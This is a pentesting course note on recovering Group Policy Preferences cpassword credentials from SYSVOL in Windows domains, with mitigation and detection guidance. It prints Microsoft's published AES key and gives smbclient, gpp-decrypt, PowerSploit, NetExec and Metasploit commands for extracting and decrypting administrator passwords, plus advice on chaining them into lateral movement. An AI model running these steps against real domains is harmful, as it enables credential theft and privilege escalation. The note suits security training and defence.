---
tags: [windows, privesc, pentesting, red-team]
difficulty: advanced
module: "43 - Windows Privilege Escalation"
topic: "43.21 Password in GPP"
---

# 21 - Password in GPP (Group Policy Preferences)

## Overview

In Windows Server 2008, Microsoft introduced Group Policy Preferences (GPP), a feature that allowed administrators to deploy specific configurations—such as mapping network drives, configuring local users and groups, setting scheduled tasks, and changing local administrator passwords—across the domain via Group Policy Objects (GPOs).

To automate password changes, GPP allowed administrators to embed passwords within the policy files. To "secure" these passwords, Microsoft encrypted them using AES-256. However, in a catastrophic design flaw, Microsoft published the static, global private AES key used to encrypt these passwords in a public MSDN article. This allowed anyone with read access to the SYSVOL share (which is every authenticated user in the domain) to download the GPP XML files, extract the encrypted `cpassword` string, and instantly decrypt it using the public key.

While Microsoft released a patch (MS14-025) in 2014 that prevented administrators from creating *new* GPP passwords, the patch did not delete *existing* XML files. Thus, GPP passwords remain a prevalent vulnerability in older domains.

## The Architecture of GPP Exploitation

```text
+-------------------------------------------------------------------------+
|                       GPP `cpassword` Attack Flow                       |
|                                                                         |
|  +-------------------+               +-------------------------------+  |
|  | Domain Controller |               | Domain Sysvol Share           |  |
|  | (Group Policy Mgmt|==============>| \\domain.local\SYSVOL\...\  |  |
|  +-------------------+   Publishes   | Groups.xml (cpassword)        |  |
|                                      +---------------+---------------+  |
|                                                      |                  |
|                                          Read Access |                  |
|                                      (All Domain Users)|                |
|                                                      v                  |
|  +-------------------+               +-------------------------------+  |
|  | Attacker Machine  |               | Attacker User / Pivot Box     |  |
|  | (Kali / Parrot)   |<==============| (Low Privileged Domain User)  |  |
|  +---------+---------+   Downloads   +-------------------------------+  |
|            |                                                            |
|            v                                                            |
|  +-------------------+                                                  |
|  | Local Decryption  |                                                  |
|  | (Using Microsoft's|                                                  |
|  | public AES Key)   |                                                  |
|  +---------+---------+                                                  |
|            |                                                            |
|            v                                                            |
|  +-------------------+                                                  |
|  | Plaintext Admin   | ---> Escalate to Local Admin / Domain Admin      |
|  | Password Obtained |                                                  |
|  +-------------------+                                                  |
+-------------------------------------------------------------------------+
```

## Deep Dive: The Flaw

When an administrator used GPP to set a local administrator password or map a drive with credentials, the policy was saved as an XML file within the SYSVOL share. 

**Common files to look for:**
- `Groups.xml`
- `Services.xml`
- `ScheduledTasks.xml`
- `DataSources.xml`
- `Printers.xml`
- `Drives.xml`

Inside these XML files, the password is stored in the `cpassword` attribute:
```xml
<User userName="Administrator" newName="Administrator" description="Built-in Administrator" cpassword="azVJmXh/J9KrU5n0czX1uB...">
```

The AES-256 key published by Microsoft (in hex format) is:
`4e 99 06 e8 fc b6 6c c9 fa f4 93 10 62 0f fe e8 f4 96 e8 06 cc 05 79 90 20 9b 09 a4 33 b6 6c 1b`

Because every authenticated domain user has read access to the SYSVOL share (necessary to process group policies), any compromised standard user account can query these files.

## Exploitation Scenarios

### 1. Manual Extraction via SMB
If you have a foothold on a Linux machine and valid domain credentials (or a shell on a domain-joined Windows machine), you can browse SYSVOL.

From Linux using `smbclient`:
```bash
smbclient //192.168.1.10/SYSVOL -U "user@domain.local"
smb: \> cd domain.local\Policies\
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *.xml
```
Once downloaded, grep the files for `cpassword`. If you find one, you can use `gpp-decrypt` (built into Kali Linux):
```bash
gpp-decrypt "azVJmXh/J9KrU5n0czX1uB..."
# Output: Decrypted password: SuperSecretAdminPassword!
```

### 2. Using PowerSploit (Get-GPPPassword)
If you have a PowerShell session on a domain-joined machine, you can automate the process using the PowerSploit framework.

```powershell
Import-Module .\PowerUp.ps1
Get-GPPPassword
```
This script automatically queries SYSVOL, parses all XML files, extracts the `cpassword`, and decrypts it on the fly, outputting the plaintext credentials directly to the console.

### 3. Using CrackMapExec / NetExec
NetExec includes a module specifically for identifying and decrypting GPP passwords across the domain.

```bash
netexec smb 192.168.1.10 -u 'user' -p 'password' -M gpp_password
```

### 4. Using Metasploit
```ruby
use post/windows/gather/credentials/gpp
set SESSION 1
run
```

## Defensive Strategies & Mitigation

The release of MS14-025 simply removed the GUI option to input passwords into GPP. It did **not** delete the existing `Groups.xml` files from SYSVOL. 

### Remediation Steps
1. **Delete Old Policies**: Administrators must manually search the SYSVOL share for any XML files containing `cpassword` attributes and delete those policies.
2. **Implement LAPS**: Instead of using GPP to standardize local administrator passwords, organizations should deploy the Local Administrator Password Solution (LAPS). LAPS randomizes the password for every machine and stores it securely in Active Directory, protected by strict ACLs.
3. **Audit SYSVOL**: Regularly scan the SYSVOL directory for sensitive information. Tools like PingCastle and BloodHound evaluate domains for exactly this kind of misconfiguration.

## Detection and Logging

Detecting the retrieval of GPP passwords is very difficult because reading SYSVOL is a normal, continuous background process for every computer and user in the domain.
- **Event ID 5140 (A network share object was accessed)**: Monitoring access to `\\*\SYSVOL\*\Policies\*\*.xml`. However, filtering out legitimate Group Policy processing from malicious reads is highly prone to false positives.
- **Honeypot Tokens**: A highly effective detection strategy is to purposefully create a fake `Groups.xml` in SYSVOL with a decoy `cpassword`. Alerting is triggered whenever the plaintext version of that decoy password is used in a logon attempt anywhere in the domain (Event ID 4624/4625).

## Chaining Opportunities

- **[[20 - Pass the Hash on Local Admin]]**: If the GPP password reveals the local administrator password, you can use PtH or the plaintext password to compromise every machine where that policy was applied.
- **[[28 - Token Impersonation]]**: If the password belongs to a service account running highly privileged services, you can pivot to machines running those services and impersonate their tokens.
- **[[22 - LAPS]]**: Discovering GPP passwords is often the precursor to explaining why LAPS is a critical enterprise requirement. 

## Related Notes
- [[17 - Stored Credentials Files]]
- [[18 - PowerShell History File]]
- [[19 - DPAPI]]
